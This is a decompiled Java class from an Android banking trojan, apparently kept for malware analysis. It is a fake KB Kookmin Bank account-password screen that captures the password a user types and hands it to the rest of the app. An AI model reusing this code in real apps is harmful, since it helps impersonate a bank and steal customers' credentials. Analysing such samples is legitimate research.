package com.kbstar.kb.android.star;

import android.app.Activity;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Bundle;
import android.text.Editable;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;
import com.kbstar.kb.android.star.util.GeneralUtil;
import java.util.List;

public class KB_Account_Psw
  extends Activity
  implements View.OnClickListener
{
  private final int ACCOUNT_PSW = 400;
  private ImageView btn_cancel;
  private ImageView btn_confirm;
  private EditText et_account_psw;
  private Toast toast;
  
  private void initView()
  {
    this.et_account_psw = ((EditText)findViewById(2131296263));
    this.btn_cancel = ((ImageView)findViewById(2131296265));
    this.btn_confirm = ((ImageView)findViewById(2131296264));
    this.btn_cancel.setOnClickListener(this);
    this.btn_confirm.setOnClickListener(this);
  }
  
  private void validation()
  {
    String str = this.et_account_psw.getText().toString().trim();
    if (str.length() < 4)
    {
      this.toast = Toast.makeText(getApplicationContext(), getResources().getString(2131361801), 0);
      this.toast.setGravity(17, 0, 0);
      this.toast.show();
      return;
    }
    Intent localIntent = new Intent();
    localIntent.putExtra("psw", str);
    setResult(400, localIntent);
    GeneralUtil.dismissKeyBoard(this);
    finish();
  }
  
  public void onClick(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131296265: 
      finish();
      return;
    }
    validation();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    GeneralUtil.activityList.add(this);
    super.onCreate(paramBundle);
    getWindow().requestFeature(1);
    setContentView(2130903044);
    initView();
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/KB_Account_Psw.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */